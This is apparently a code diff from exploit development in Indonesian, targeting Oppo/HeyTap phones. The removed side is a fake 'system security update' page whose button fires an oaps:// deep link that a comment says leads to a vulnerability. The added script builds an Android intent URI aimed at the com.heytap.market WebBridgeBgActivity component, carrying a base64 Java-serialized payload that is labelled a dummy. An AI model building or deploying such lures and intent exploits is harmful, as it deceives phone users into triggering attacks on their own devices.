@@ -1,22 +1,12 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Sistem Update Oppo</title>
-</head>
-<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
-    <h2>Pembaruan Komponen Sistem Tersedia</h2>
-    <p>Silakan klik tombol di bawah untuk memulai pembaruan keamanan.</p>
-    
-    <button id="updateBtn" style="padding: 15px 30px; font-size: 18px; color: white; background-color: #008f39; border: none; border-radius: 5px; cursor: pointer;">
-        Update Sekarang
-    </button>
-
-    <script>
-        document.getElementById('updateBtn').onclick = function() {
-            // Ini adalah Deep Link yang mengarah ke celah keamanan
-            const intentUrl = "oaps://add?ckey=test&cb=rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw";
-            window.location.href = intentUrl;
-        };
-    </script>
-</body>
-</html>
+<script>
+    document.getElementById('updateBtn').onclick = function() {
+        // Payload dummy dalam base64
+        const payload = "rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw";
+        
+        // Konstruksi Intent URI yang lebih kuat untuk memaksa browser bereaksi
+        const intentUrl = "intent://add?ckey=test&cb=" + payload + "#Intent;scheme=oaps;package=com.heytap.market;component=com.heytap.market/com.cdo.oaps.api.host.WebBridgeBgActivity;S.browser_fallback_url=https%3A%2F%2Fgoogle.com;end";
+        
+        console.log("Memicu Intent: " + intentUrl);
+        window.location.href = intentUrl;
+    };
+</script>
